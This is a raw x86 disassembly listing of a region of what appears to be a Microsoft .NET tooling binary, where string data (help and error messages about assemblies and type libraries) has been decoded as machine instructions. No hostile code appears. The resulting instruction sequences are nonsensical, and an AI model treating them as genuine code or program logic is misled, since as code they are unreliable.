  404e78:	bound  ebp,QWORD PTR [ecx+edi*2+0x3a]
  404e7c:	or     eax,0x5514010a
  404e81:	outs   dx,BYTE PTR ds:[esi]
  404e82:	imul   ebp,DWORD PTR [esi+0x6f],0x77
  404e86:	outs   dx,BYTE PTR ds:[esi]
  404e87:	and    BYTE PTR [edi+0x70],ch
  404e8a:	je     0x404ef5
  404e8c:	outs   dx,DWORD PTR ds:[esi]
  404e8d:	outs   dx,BYTE PTR ds:[esi]
  404e8e:	cmp    ah,BYTE PTR [eax]
  404e90:	das    
  404e91:	jnp    0x404ec3
  404e93:	jge    0x404e96
  404e95:	and    BYTE PTR [eax+ebp*2+0x65],dl
  404e99:	and    BYTE PTR [edi],ch
  404e9b:	jnp    0x404ecd
  404e9d:	jge    0x404ebf
  404e9f:	outs   dx,DWORD PTR ds:[esi]
  404ea0:	jo     0x404f16
  404ea2:	imul   ebp,DWORD PTR [edi+0x6e],0x71657220
  404ea9:	jne    0x404f14
  404eab:	jb     0x404f12
  404ead:	jae    0x404ecf
  404eaf:	popa   
  404eb0:	and    BYTE PTR [esi+0x61],dh
  404eb3:	ins    BYTE PTR es:[edi],dx
  404eb4:	jne    0x404f1b
  404eb6:	add    DWORD PTR [eax+0x52],esp
  404eb9:	gs data16 gs jb 0x404f23
  404ebe:	outs   dx,BYTE PTR ds:[esi]
  404ebf:	arpl   WORD PTR [ebp+0x64],sp
  404ec2:	and    BYTE PTR [ecx+0x73],ah
  404ec5:	jae    0x404f2c
  404ec7:	ins    DWORD PTR es:[edi],dx
  404ec8:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  404ecc:	daa    
  404ecd:	jnp    0x404eff
  404ecf:	jge    0x404ef8
  404ed1:	and    BYTE PTR [eax+0x61],ch
  404ed4:	jae    0x404ef6
  404ed6:	bound  esp,QWORD PTR [ebp+0x65]
  404ed9:	outs   dx,BYTE PTR ds:[esi]
  404eda:	and    BYTE PTR [edx+0x65],dh
  404edd:	jae    0x404f4e
  404edf:	ins    BYTE PTR es:[edi],dx
  404ee0:	jbe    0x404f47
  404ee2:	and    BYTE PTR fs:[edi+ebp*2+0x20],dh
  404ee7:	je     0x404f62
  404ee9:	jo     0x404f50
  404eeb:	and    BYTE PTR [ecx+ebp*2+0x62],ch
  404eef:	jb     0x404f52
  404ef1:	jb     0x404f6c
  404ef3:	and    BYTE PTR [edi],ah
  404ef5:	jnp    0x404f28
  404ef7:	jge    0x404f20
  404ef9:	and    BYTE PTR [edi+0x69],dh
  404efc:	je     0x404f66
  404efe:	and    BYTE PTR [esp+ecx*2+0x42],dl
  404f02:	dec    ecx
  404f03:	inc    esp
  404f04:	and    BYTE PTR [ebx+0x32],bh
  404f07:	jge    0x404f29
  404f09:	popa   
  404f0a:	outs   dx,BYTE PTR ds:[esi]
  404f0b:	and    BYTE PTR fs:[esi+0x65],dh
  404f0f:	jb     0x404f84
  404f11:	imul   ebp,DWORD PTR [edi+0x6e],0x7d337b20
  404f18:	add    DWORD PTR [edx],ebx
  404f1a:	inc    ecx
  404f1b:	jae    0x404f90
  404f1d:	gs ins DWORD PTR es:[edi],dx
  404f1f:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  404f23:	gs js  0x404f96
  404f26:	outs   dx,DWORD PTR ds:[esi]
  404f27:	jb     0x404f9d
  404f29:	gs and BYTE PTR fs:[edi+ebp*2+0x20],dh
  404f2f:	daa    
  404f30:	jnp    0x404f62
  404f32:	jge    0x404f5b
  404f34:	add    DWORD PTR [esi],ebx
  404f36:	inc    ecx
  404f37:	jne    0x404fad
  404f39:	outs   dx,DWORD PTR ds:[esi]
  404f3a:	and    BYTE PTR [ebp+0x78],ah
  404f3d:	jo     0x404fae
  404f3f:	jb     0x404fb5
  404f41:	imul   ebp,DWORD PTR [esi+0x67],0x307b2720
  404f48:	jge    0x404f71
  404f4a:	and    BYTE PTR [edi+ebp*2+0x20],dh
  404f4e:	daa    
  404f4f:	jnp    0x404f82
  404f51:	jge    0x404f7a
  404f53:	add    DWORD PTR cs:[ecx+0x63694d01],eax
  404f5a:	jb     0x404fcb
  404f5c:	jae    0x404fcd
  404f5e:	data16 je 0x404f81
  404f61:	sub    BYTE PTR [edx+0x29],dl
  404f64:	and    BYTE PTR [esi],ch
  404f66:	dec    esi
  404f67:	inc    ebp
  404f68:	push   esp
  404f69:	and    BYTE PTR [esi+0x72],al
  404f6c:	popa   
  404f6d:	ins    DWORD PTR es:[edi],dx
  404f6e:	gs ja  0x404fe0
  404f71:	jb     0x404fde
  404f73:	and    BYTE PTR [ecx+0x73],al
  404f76:	jae    0x404fdd
  404f78:	ins    DWORD PTR es:[edi],dx
  404f79:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  404f7d:	je     0x404fee
  404f7f:	and    BYTE PTR [ecx+edi*2+0x70],dl
  404f83:	and    BYTE PTR gs:[ecx+ebp*2+0x62],cl
  404f88:	jb     0x404feb
  404f8a:	jb     0x405005
  404f8c:	and    BYTE PTR [ebx+0x6f],al
  404f8f:	outs   dx,BYTE PTR ds:[esi]
  404f90:	jbe    0x404ff7
  404f92:	jb     0x405008
  404f94:	gs jb  0x404fb7
  404f97:	jnp    0x404fc9
  404f99:	jge    0x404fa8
  404f9b:	or     al,BYTE PTR [ebx+0x6f]
  404f9e:	jo     0x405019
  404fa0:	jb     0x40500b
  404fa2:	addr16 push 0x43282074
  404fa8:	sub    DWORD PTR [eax],esp
  404faa:	dec    ebp
  404fab:	imul   esp,DWORD PTR [ebx+0x72],0x666f736f
  404fb2:	je     0x404fd4
  404fb4:	inc    ebx
  404fb5:	outs   dx,DWORD PTR ds:[esi]
  404fb6:	jb     0x405028
  404fb8:	outs   dx,DWORD PTR ds:[esi]
  404fb9:	jb     0x40501c
  404fbb:	je     0x405026
  404fbd:	outs   dx,DWORD PTR ds:[esi]
  404fbe:	outs   dx,BYTE PTR ds:[esi]
  404fbf:	and    BYTE PTR cs:[eax],ah
  404fc2:	inc    ecx
  404fc3:	ins    BYTE PTR es:[edi],dx
  404fc4:	ins    BYTE PTR es:[edi],dx
  404fc5:	and    BYTE PTR [edx+0x69],dh
  404fc8:	addr16 push 0x72207374
  404fce:	gs jae 0x405036
  404fd1:	jb     0x405049
  404fd3:	gs fs cs or eax,0x4514010a
  404fdb:	js     0x405040
  404fdd:	gs jo  0x405054
  404fe0:	imul   ebp,DWORD PTR [edi+0x6e],0x7d307b5b
  404fe7:	pop    ebp
  404fe8:	and    BYTE PTR ds:0x7d317b20,bh
  404fee:	add    DWORD PTR [edi],edx
  404ff0:	inc    ebp
  404ff1:	js     0x405056
  404ff3:	gs jo  0x40506a
  404ff6:	imul   ebp,DWORD PTR [edi+0x6e],0x7d307b5b
  404ffd:	pop    ebp
  404ffe:	and    BYTE PTR ds:0x203e3e3d,bh
  405004:	jnp    0x405037
  405006:	jge    0x405009
  405008:	mov    BYTE PTR [ecx],al
  40500a:	push   edi
  40500b:	push   0x20656c69
  405010:	jb     0x405077
  405012:	jae    0x405083
  405014:	ins    BYTE PTR es:[edi],dx
  405015:	jbe    0x405080
  405017:	outs   dx,BYTE PTR ds:[esi]
  405018:	and    BYTE PTR [si+0x68],dh
  40501c:	and    BYTE PTR gs:[edx+0x65],dh
  405020:	data16 gs jb 0x405089
  405024:	outs   dx,BYTE PTR ds:[esi]
  405025:	arpl   WORD PTR [ebp+0x20],sp
  405028:	outs   dx,WORD PTR ds:[esi]
  40502a:	jb     0x40504c
  40502c:	je     0x4050a7
  40502e:	jo     0x405095
  405030:	and    BYTE PTR [ecx+ebp*2+0x62],ch
  405034:	jb     0x405097
  405036:	jb     0x4050b1
  405038:	and    BYTE PTR [edi],ah
  40503a:	jnp    0x40506c
  40503c:	jge    0x405065
  40503e:	sub    al,0x20
  405040:	je     0x4050aa
  405042:	and    BYTE PTR gs:[esi+0x6f],ah
  405046:	ins    BYTE PTR es:[edi],dx
  405047:	ins    BYTE PTR es:[edi],dx
  405048:	outs   dx,DWORD PTR ds:[esi]
  405049:	ja     0x4050b4
  40504b:	outs   dx,BYTE PTR ds:[esi]
  40504c:	and    BYTE PTR [bp+0x6f],ch
  405050:	outs   dx,BYTE PTR ds:[esi]
  405051:	and    BYTE PTR [ecx+edi*2+0x70],dh
  405055:	and    BYTE PTR gs:[ecx+ebp*2+0x62],ch
  40505a:	jb     0x4050bd
  40505c:	jb     0x4050d7
  40505e:	and    BYTE PTR [esi+0x69],ah
  405061:	ins    BYTE PTR es:[edi],dx
  405062:	and    BYTE PTR gs:[edi+0x69],dh
  405066:	je     0x4050d0
  405068:	and    BYTE PTR [ecx+0x20],ah
  40506b:	ins    DWORD PTR es:[edi],dx
  40506c:	popa   
  40506d:	je     0x4050d2
  40506f:	push   0x20676e69
  405074:	jae    0x4050df
  405076:	ins    DWORD PTR es:[edi],dx
  405077:	jo     0x4050e5
  405079:	and    BYTE PTR gs:[esi+0x61],ch
  40507d:	ins    DWORD PTR es:[edi],dx
  40507e:	and    BYTE PTR gs:[edi+0x61],dh
  405082:	jae    0x4050a4
  405084:	jae    0x4050f1
  405086:	imul   esi,DWORD PTR [eax+0x70],0x27206465
  40508d:	jnp    0x4050c0
  40508f:	jge    0x4050b8
  405091:	add    DWORD PTR cs:[ebp+0x41],ebx
  405095:	jae    0x40510a
  405097:	gs ins DWORD PTR es:[edi],dx
  405099:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  40509d:	jb     0x405104
  40509f:	data16 gs jb 0x405108
  4050a3:	outs   dx,BYTE PTR ds:[esi]
  4050a4:	arpl   WORD PTR [ebp+0x20],sp
  4050a7:	daa    
  4050a8:	jnp    0x4050da
  4050aa:	jge    0x4050d3
  4050ac:	and    BYTE PTR [eax+0x61],ch
  4050af:	jae    0x4050d1
  4050b1:	bound  esp,QWORD PTR [ebp+0x65]
  4050b4:	outs   dx,BYTE PTR ds:[esi]
  4050b5:	and    BYTE PTR [edx+0x65],dh
  4050b8:	jae    0x405129
  4050ba:	ins    BYTE PTR es:[edi],dx
  4050bb:	jbe    0x405122
  4050bd:	and    BYTE PTR fs:[edi+ebp*2+0x20],dh
  4050c2:	popa   
  4050c3:	jae    0x405138
  4050c5:	gs ins DWORD PTR es:[edi],dx
  4050c7:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  4050cb:	daa    
  4050cc:	jnp    0x4050ff
  4050ce:	jge    0x4050f7
  4050d0:	and    BYTE PTR [edi+0x69],dh
  4050d3:	je     0x40513d
  4050d5:	and    BYTE PTR [eax+ebp*2+0x65],dh
  4050d9:	and    BYTE PTR [esi+0x6f],ah
  4050dc:	ins    BYTE PTR es:[edi],dx
  4050dd:	ins    BYTE PTR es:[edi],dx
  4050de:	outs   dx,DWORD PTR ds:[esi]
  4050df:	ja     0x40514a
  4050e1:	outs   dx,BYTE PTR ds:[esi]
  4050e2:	and    BYTE PTR [bp+di+0x6f],ah
  4050e6:	fs bound esp,QWORD PTR gs:[ecx+0x73]
  4050eb:	cmp    ah,BYTE PTR gs:[eax]
  4050ee:	jnp    0x405122
  4050f0:	jge    0x4050f3
  4050f2:	mov    ecx,0x69685702
  4050f7:	ins    BYTE PTR es:[edi],dx
  4050f8:	and    BYTE PTR gs:[edx+0x65],dh
  4050fc:	jae    0x40516d
  4050fe:	ins    BYTE PTR es:[edi],dx
  4050ff:	jbe    0x40516a
  405101:	outs   dx,BYTE PTR ds:[esi]
  405102:	and    BYTE PTR [si+0x68],dh
  405106:	and    BYTE PTR gs:[edx+0x65],dh
  40510a:	data16 gs jb 0x405173
  40510e:	outs   dx,BYTE PTR ds:[esi]
  40510f:	arpl   WORD PTR [ebp+0x20],sp
  405112:	outs   dx,WORD PTR ds:[esi]
  405114:	jb     0x405136
  405116:	je     0x405191
  405118:	jo     0x40517f
  40511a:	and    BYTE PTR [ecx+ebp*2+0x62],ch
  40511e:	jb     0x405181
  405120:	jb     0x40519b
  405122:	and    BYTE PTR [edi],ah
  405124:	jnp    0x405156
  405126:	jge    0x40514f
  405128:	sub    al,0x20
  40512a:	je     0x405194
  40512c:	and    BYTE PTR gs:[esi+0x6f],ah
  405130:	ins    BYTE PTR es:[edi],dx
  405131:	ins    BYTE PTR es:[edi],dx
  405132:	outs   dx,DWORD PTR ds:[esi]
  405133:	ja     0x40519e
  405135:	outs   dx,BYTE PTR ds:[esi]
  405136:	and    BYTE PTR [si+0x79],dh
  40513a:	jo     0x4051a1
  40513c:	and    BYTE PTR [ecx+ebp*2+0x62],ch
  405140:	jb     0x4051a3
  405142:	jb     0x4051bd
  405144:	and    BYTE PTR [edi+0x69],dh
  405147:	je     0x4051b1
  405149:	and    BYTE PTR [ecx+0x20],ah
  40514c:	ins    DWORD PTR es:[edi],dx
  40514d:	popa   
  40514e:	je     0x4051b3
  405150:	push   0x20676e69
  405155:	jae    0x4051c0
  405157:	ins    DWORD PTR es:[edi],dx
  405158:	jo     0x4051c6
  40515a:	and    BYTE PTR gs:[esi+0x61],ch
  40515e:	ins    DWORD PTR es:[edi],dx
  40515f:	and    BYTE PTR gs:[edi+0x61],dh
  405163:	jae    0x405185
  405165:	jae    0x4051d2
  405167:	imul   esi,DWORD PTR [eax+0x70],0x27206465
  40516e:	jnp    0x4051a1
  405170:	jge    0x405199
  405172:	and    BYTE PTR [ebx+0x69],dh
  405175:	outs   dx,BYTE PTR ds:[esi]
  405176:	arpl   WORD PTR [ebp+0x20],sp
  405179:	imul   esi,DWORD PTR [edi+eiz*1+0x73],0x424c5420
  405181:	dec    ecx
  405182:	inc    esp
  405183:	and    BYTE PTR [edi+0x72],ch
  405186:	and    BYTE PTR [esi+0x65],dh
  405189:	jb     0x4051fe
  40518b:	imul   ebp,DWORD PTR [edi+0x6e],0x6d756e20
  405192:	bound  esp,QWORD PTR [ebp+0x72]
  405195:	and    BYTE PTR [ecx+ebp*2+0x64],ah
  405199:	outs   dx,BYTE PTR ds:[esi]
  40519a:	daa    
  40519b:	je     0x4051bd
  40519d:	ins    DWORD PTR es:[edi],dx
  40519e:	popa   
  40519f:	je     0x405204
  4051a1:	push   0x6854202e
  4051a6:	and    BYTE PTR gs:[edx+0x65],dh
  4051aa:	data16 gs jb 0x405213
  4051ae:	outs   dx,BYTE PTR ds:[esi]
  4051af:	arpl   WORD PTR [ebp+0x64],sp
  4051b2:	and    BYTE PTR [ecx+edi*2+0x70],dh
  4051b6:	and    BYTE PTR gs:[ecx+ebp*2+0x62],ch
  4051bb:	jb     0x40521e
  4051bd:	jb     0x405238
  4051bf:	and    BYTE PTR [eax+0x61],ch
  4051c2:	and    BYTE PTR fs:[ecx+0x20],ah
  4051c6:	push   esp
  4051c7:	dec    esp
  4051c8:	inc    edx
  4051c9:	dec    ecx
  4051ca:	inc    esp
  4051cb:	and    BYTE PTR [edi+0x66],ch
  4051ce:	and    BYTE PTR [ebx+0x32],bh
  4051d1:	jge    0x4051f3
  4051d3:	popa   
  4051d4:	outs   dx,BYTE PTR ds:[esi]
  4051d5:	and    BYTE PTR fs:[ecx+0x20],ah
  4051d9:	jbe    0x405240
  4051db:	jb     0x405250
  4051dd:	imul   ebp,DWORD PTR [edi+0x6e],0x20666f20
  4051e4:	jnp    0x405219
  4051e6:	jge    0x405208
  4051e8:	ja     0x405252
  4051ea:	imul   ebp,DWORD PTR [ebp+eiz*2+0x20],0x20656874
  4051f2:	outs   dx,DWORD PTR ds:[esi]
  4051f3:	outs   dx,BYTE PTR ds:[esi]
  4051f4:	and    BYTE PTR gs:[eax+ebp*2+0x61],dh
  4051f9:	je     0x40521b
  4051fb:	ja     0x40525e
  4051fd:	jae    0x40521f
  4051ff:	outs   dx,WORD PTR ds:[esi]
  405201:	jne    0x405271
  405203:	and    BYTE PTR fs:[eax+0x61],ch
  405207:	and    BYTE PTR fs:[ecx+0x20],ah
  40520b:	push   esp
  40520c:	dec    esp
  40520d:	inc    edx
  40520e:	dec    ecx
  40520f:	inc    esp
  405210:	and    BYTE PTR [edi+0x66],ch
  405213:	and    BYTE PTR [ebx+0x34],bh
  405216:	jge    0x405238
  405218:	popa   
  405219:	outs   dx,BYTE PTR ds:[esi]
  40521a:	and    BYTE PTR fs:[ecx+0x20],ah
  40521e:	jbe    0x405285
  405220:	jb     0x405295
  405222:	imul   ebp,DWORD PTR [edi+0x6e],0x20666f20
  405229:	jnp    0x405260
  40522b:	jge    0x40525b
  40522d:	add    DWORD PTR [eax+0x52],esp
  405230:	gs data16 gs jb 0x40529a
  405235:	outs   dx,BYTE PTR ds:[esi]
  405236:	arpl   WORD PTR [ebp+0x64],sp
  405239:	and    BYTE PTR [ecx+edi*2+0x70],dh
  40523d:	and    BYTE PTR gs:[ecx+ebp*2+0x62],ch
  405242:	jb     0x4052a5
  405244:	jb     0x4052bf
  405246:	and    BYTE PTR [edi+0x69],dh
  405249:	je     0x4052b3
  40524b:	and    BYTE PTR [ebx+0x69],dh
  40524e:	ins    DWORD PTR es:[edi],dx
  40524f:	jo     0x4052bd
  405251:	and    BYTE PTR gs:[esi+0x61],ch
  405255:	ins    DWORD PTR es:[edi],dx
  405256:	and    BYTE PTR gs:[edi],ah
  405259:	jnp    0x40528b
  40525b:	jge    0x405284
  40525d:	sub    al,0x20
  40525f:	push   esp
  405260:	dec    esp
  405261:	inc    edx
  405262:	dec    ecx
  405263:	inc    esp
  405264:	and    BYTE PTR [ebx+0x31],bh
  405267:	jge    0x405289
  405269:	popa   
  40526a:	outs   dx,BYTE PTR ds:[esi]
  40526b:	and    BYTE PTR fs:[esi+0x65],dh
  40526f:	jb     0x4052e4
  405271:	imul   ebp,DWORD PTR [edi+0x6e],0x7d327b20
  405278:	and    BYTE PTR [edi+0x61],dh
  40527b:	jae    0x40529d
  40527d:	jb     0x4052e4
  40527f:	jae    0x4052f0
  405281:	ins    BYTE PTR es:[edi],dx
  405282:	jbe    0x4052e9
  405284:	and    BYTE PTR fs:[edi+ebp*2+0x3a],dh
  405289:	and    BYTE PTR [edi],ah
  40528b:	jnp    0x4052c0
  40528d:	jge    0x4052b6
  40528f:	add    DWORD PTR [edx+0x41],eax
  405292:	je     0x405308
  405294:	gs ins DWORD PTR es:[edi],dx
  405296:	jo     0x40530c
  405298:	imul   ebp,DWORD PTR [esi+0x67],0x206f7420
  40529f:	jb     0x405306
  4052a1:	jae    0x405312
  4052a3:	ins    BYTE PTR es:[edi],dx
  4052a4:	jbe    0x40530b
  4052a6:	and    BYTE PTR [edx+0x65],dh
  4052a9:	data16 gs jb 0x405312
  4052ad:	outs   dx,BYTE PTR ds:[esi]
  4052ae:	arpl   WORD PTR [ebp+0x64],sp
  4052b1:	and    BYTE PTR [ecx+0x73],ah
  4052b4:	jae    0x40531b
  4052b6:	ins    DWORD PTR es:[edi],dx
  4052b7:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  4052bb:	daa    
  4052bc:	jnp    0x4052ee
  4052be:	jge    0x4052e7
  4052c0:	and    BYTE PTR [edi+ebp*2+0x20],dh
  4052c4:	popa   
  4052c5:	and    BYTE PTR [ecx+edi*2+0x70],dh
  4052c9:	and    BYTE PTR gs:[ecx+ebp*2+0x62],ch
  4052ce:	jb     0x405331
  4052d0:	jb     0x40534b
  4052d2:	add    DWORD PTR cs:[ebp+0x41],eax
  4052d6:	je     0x40534c
  4052d8:	gs ins DWORD PTR es:[edi],dx
  4052da:	jo     0x405350
  4052dc:	imul   ebp,DWORD PTR [esi+0x67],0x206f7420
  4052e3:	jb     0x40534a
  4052e5:	jae    0x405356
  4052e7:	ins    BYTE PTR es:[edi],dx
  4052e8:	jbe    0x40534f
  4052ea:	and    BYTE PTR [edx+0x65],dh
  4052ed:	data16 gs jb 0x405356
  4052f1:	outs   dx,BYTE PTR ds:[esi]
  4052f2:	arpl   WORD PTR [ebp+0x64],sp
  4052f5:	and    BYTE PTR [ecx+edi*2+0x70],dh
  4052f9:	and    BYTE PTR gs:[ecx+ebp*2+0x62],ch
  4052fe:	jb     0x405361
  405300:	jb     0x40537b
  405302:	and    BYTE PTR [edi+0x69],dh
  405305:	je     0x40536f
  405307:	and    BYTE PTR [ebx+0x69],dh
  40530a:	ins    DWORD PTR es:[edi],dx
  40530b:	jo     0x405379
  40530d:	and    BYTE PTR gs:[esi+0x61],ch
  405311:	ins    DWORD PTR es:[edi],dx
  405312:	and    BYTE PTR gs:[edi],ah
  405315:	jnp    0x405347
  405317:	jge    0x405340
  405319:	add    DWORD PTR cs:0x6f736552,ebp
  405320:	ins    BYTE PTR es:[edi],dx
  405321:	jbe    0x405388
  405323:	and    BYTE PTR fs:[edx+0x65],dh
  405327:	data16 gs jb 0x405390
  40532b:	outs   dx,BYTE PTR ds:[esi]
  40532c:	arpl   WORD PTR [ebp+0x64],sp
  40532f:	and    BYTE PTR [esi+0x69],ah
  405332:	ins    BYTE PTR es:[edi],dx
  405333:	and    BYTE PTR gs:[edi],ah
  405336:	jnp    0x405368
  405338:	jge    0x405361
  40533a:	and    BYTE PTR [edi+ebp*2+0x20],dh
  40533e:	imul   bp,WORD PTR [ebp+eiz*2+0x20],0x7b27
  405345:	xor    DWORD PTR [ebp+0x27],edi
  405348:	add    DWORD PTR cs:[eax],edi
  40534b:	push   ebp
  40534c:	outs   dx,BYTE PTR ds:[esi]
  40534d:	gs js  0x4053c0
  405350:	arpl   WORD PTR gs:[ebp+eiz*2+0x64],si
  405355:	and    BYTE PTR [edx+0x65],dh
  405358:	data16 gs jb 0x4053c1
  40535c:	outs   dx,BYTE PTR ds:[esi]
  40535d:	arpl   WORD PTR [ebp+0x20],sp
  405360:	je     0x4053d1
  405362:	and    BYTE PTR [ebx+0x75],al
  405365:	jae    0x4053db
  405367:	outs   dx,DWORD PTR ds:[esi]
  405368:	ins    DWORD PTR es:[edi],dx
  405369:	dec    ebp
  40536a:	popa   
  40536b:	jb     0x4053e0
  40536d:	push   0x656c6c61
  405372:	jb     0x4053e7
  405374:	cs fs ins BYTE PTR es:[edi],dx
  405377:	ins    BYTE PTR es:[edi],dx
  405378:	and    BYTE PTR [edx+0x65],dh
  40537b:	jno    0x4053f2
  40537d:	gs jae 0x4053f4
  405380:	gs and DWORD PTR fs:[ecx],eax
  405384:	das    
  405385:	push   ebx
  405386:	jns    0x4053f6
  405388:	je     0x4053eb
  40538a:	js     0x4053c6
  40538c:	and    BYTE PTR [esp+ebp*2+0x62],dl
  405390:	inc    ebp
  405391:	js     0x405403
  405393:	and    BYTE PTR [ecx+0x73],al
  405396:	jae    0x4053fd
  405398:	ins    DWORD PTR es:[edi],dx
  405399:	bound  ebp,QWORD PTR [ecx+edi*2+0x4e]
  40539d:	popa   
  40539e:	ins    DWORD PTR es:[edi],dx
  40539f:	and    BYTE PTR gs:[ebx+0x4f],bl
  4053a3:	jo     0x405419
  4053a5:	imul   ebp,DWORD PTR [edi+0x6e],0xa0d5d73
  4053ac:	dec    edi
  4053ad:	jo     0x405423
  4053af:	imul   ebp,DWORD PTR [edi+0x6e],0x48013a73
  4053b6:	and    BYTE PTR [eax],ah
  4053b8:	and    BYTE PTR [eax],ah
  4053ba:	das    
  4053bb:	outs   dx,DWORD PTR ds:[esi]
  4053bc:	jne    0x405432
  4053be:	cmp    al,BYTE PTR [esi+0x69]
  4053c1:	ins    BYTE PTR es:[edi],dx
  4053c2:	gs dec esi
  4053c4:	popa   
  4053c5:	ins    DWORD PTR es:[edi],dx
  4053c6:	and    BYTE PTR gs:[eax],ah
  4053c9:	and    BYTE PTR [eax],ah
  4053cb:	and    BYTE PTR [eax],ah
  4053cd:	and    BYTE PTR [eax],ah
  4053cf:	and    BYTE PTR [eax],ah
  4053d1:	and    BYTE PTR [eax],ah
  4053d3:	and    BYTE PTR [eax],ah
  4053d5:	and    BYTE PTR [esi+0x69],al
  4053d8:	ins    BYTE PTR es:[edi],dx
  4053d9:	and    BYTE PTR gs:[esi+0x61],ch
  4053dd:	ins    DWORD PTR es:[edi],dx
  4053de:	and    BYTE PTR gs:[edi+0x66],ch
  4053e2:	and    BYTE PTR [ecx+edi*2+0x70],dh
  4053e6:	and    BYTE PTR gs:[ecx+ebp*2+0x62],ch
  4053eb:	jb     0x40544e
  4053ed:	jb     0x405468
  4053ef:	and    BYTE PTR [edi+ebp*2+0x20],dh
  4053f3:	bound  esp,QWORD PTR [ebp+0x20]
  4053f6:	jo     0x40546a
  4053f8:	outs   dx,DWORD PTR ds:[esi]
  4053f9:	fs jne 0x40545f
  4053fc:	gs add DWORD PTR fs:[edi+0x20],eax
  405401:	and    BYTE PTR [eax],ah
  405403:	and    BYTE PTR [edi],ch
  405405:	je     0x405473
  405407:	bound  esi,QWORD PTR [edx+0x65]
  40540a:	data16 gs jb 0x405473
  40540e:	outs   dx,BYTE PTR ds:[esi]
  40540f:	arpl   WORD PTR [ebp+0x3a],sp
  405412:	push   esp
  405413:	jns    0x405485
  405415:	gs dec esp
  405417:	imul   esp,DWORD PTR [edx+0x72],0x20797261
  40541e:	and    BYTE PTR [eax],ah
  405420:	push   esp
  405421:	jns    0x405493
  405423:	and    BYTE PTR gs:[ecx+ebp*2+0x62],ch
  405428:	jb     0x40548b
  40542a:	jb     0x4054a5
  40542c:	and    BYTE PTR [ebp+0x73],dh
  40542f:	gs and BYTE PTR fs:[edi+ebp*2+0x20],dh
  405435:	jb     0x40549c
  405437:	jae    0x4054a8
  405439:	ins    BYTE PTR es:[edi],dx
  40543a:	jbe    0x4054a1
  40543c:	and    BYTE PTR [edx+0x65],dh
  40543f:	data16 gs jb 0x4054a8
  405443:	outs   dx,BYTE PTR ds:[esi]
  405444:	arpl   WORD PTR [ebp+0x73],sp
  405447:	add    DWORD PTR [esi+0x20],ecx
  40544a:	and    BYTE PTR [eax],ah
  40544c:	and    BYTE PTR [edi],ch
  40544e:	je     0x4054bc
  405450:	bound  esi,QWORD PTR [edx+0x65]
  405453:	data16 jo 0x4054b7
  405456:	je     0x4054c0
  405458:	cmp    dl,BYTE PTR [eax+0x61]
  40545b:	je     0x4054c5
  40545d:	and    BYTE PTR [eax],ah
  40545f:	and    BYTE PTR [eax],ah
  405461:	and    BYTE PTR [eax],ah
  405463:	and    BYTE PTR [eax],ah
  405465:	and    BYTE PTR [eax],ah
  405467:	and    BYTE PTR [eax],ah
  405469:	push   eax
  40546a:	popa   
  40546b:	je     0x4054d5
  40546d:	and    BYTE PTR [ebp+0x73],dh
  405470:	gs and BYTE PTR fs:[edi+ebp*2+0x20],dh
  405476:	jb     0x4054dd
  405478:	jae    0x4054e9
  40547a:	ins    BYTE PTR es:[edi],dx
  40547b:	jbe    0x4054e2
  40547d:	and    BYTE PTR [edx+0x65],dh
  405480:	data16 gs jb 0x4054e9
  405484:	outs   dx,BYTE PTR ds:[esi]
  405485:	arpl   WORD PTR [ebp+0x64],sp
  405488:	and    BYTE PTR [ecx+edi*2+0x70],dh
  40548c:	and    BYTE PTR gs:[ecx+ebp*2+0x62],ch
  405491:	jb     0x4054f4
  405493:	jb     0x4054fe
  405495:	gs jae 0x405499
  405498:	inc    ecx
  405499:	and    BYTE PTR [eax],ah
  40549b:	and    BYTE PTR [eax],ah
  40549d:	das    
  40549e:	popa   
  40549f:	jae    0x40550e
  4054a1:	jo     0x405504
  4054a3:	je     0x40550d
  4054a5:	cmp    al,BYTE PTR [ecx+ebp*2+0x72]
  4054a9:	arpl   WORD PTR gs:[edi+ebp*2+0x72],si
  4054ae:	jns    0x4054d0
  4054b0:	and    BYTE PTR [eax],ah
  4054b2:	and    BYTE PTR [eax],ah
  4054b4:	and    BYTE PTR [eax],ah
  4054b6:	and    BYTE PTR [eax],ah
  4054b8:	and    BYTE PTR [edi+ebp*2+0x6f],cl
  4054bc:	imul   esp,DWORD PTR [eax],0x66
  4054bf:	outs   dx,DWORD PTR ds:[esi]
  4054c0:	jb     0x4054e2
  4054c2:	popa   
  4054c3:	jae    0x405538
  4054c5:	gs ins DWORD PTR es:[edi],dx
  4054c7:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  4054cb:	jb     0x405532
  4054cd:	data16 gs jb 0x405536
  4054d1:	outs   dx,BYTE PTR ds:[esi]
  4054d2:	arpl   WORD PTR [ebp+0x73],sp
  4054d5:	and    BYTE PTR [eax+0x65],ch
  4054d8:	jb     0x40553f
  4054da:	add    DWORD PTR [eax+eiz*1],edi
  4054dd:	and    BYTE PTR [eax],ah
  4054df:	and    BYTE PTR [edi],ch
  4054e1:	ja     0x40554c
  4054e3:	outs   dx,BYTE PTR ds:[esi]
  4054e4:	xor    esi,DWORD PTR [edx]
  4054e6:	and    BYTE PTR [eax],ah
  4054e8:	and    BYTE PTR [eax],ah
  4054ea:	and    BYTE PTR [eax],ah
  4054ec:	and    BYTE PTR [eax],ah
  4054ee:	and    BYTE PTR [eax],ah
  4054f0:	and    BYTE PTR [eax],ah
  4054f2:	and    BYTE PTR [eax],ah
  4054f4:	and    BYTE PTR [eax],ah
  4054f6:	and    BYTE PTR [eax],ah
  4054f8:	and    BYTE PTR [eax],ah
  4054fa:	and    BYTE PTR [eax],ah
  4054fc:	inc    ebx
  4054fd:	jb     0x405564
  4054ff:	popa   
  405500:	je     0x405567
  405502:	and    BYTE PTR [ecx+0x20],ah
  405505:	xor    esi,DWORD PTR [edx]
  405507:	sub    eax,0x20746962
  40550c:	je     0x405587
  40550e:	jo     0x405575
  405510:	and    BYTE PTR [ecx+ebp*2+0x62],ch
  405514:	jb     0x405577
  405516:	jb     0x405591
  405518:	add    DWORD PTR [eax+eiz*1],edi
  40551b:	and    BYTE PTR [eax],ah
  40551d:	and    BYTE PTR [edi],ch
  40551f:	ja     0x40558a
  405521:	outs   dx,BYTE PTR ds:[esi]
  405522:	ss xor al,0x20
  405525:	and    BYTE PTR [eax],ah
  405527:	and    BYTE PTR [eax],ah
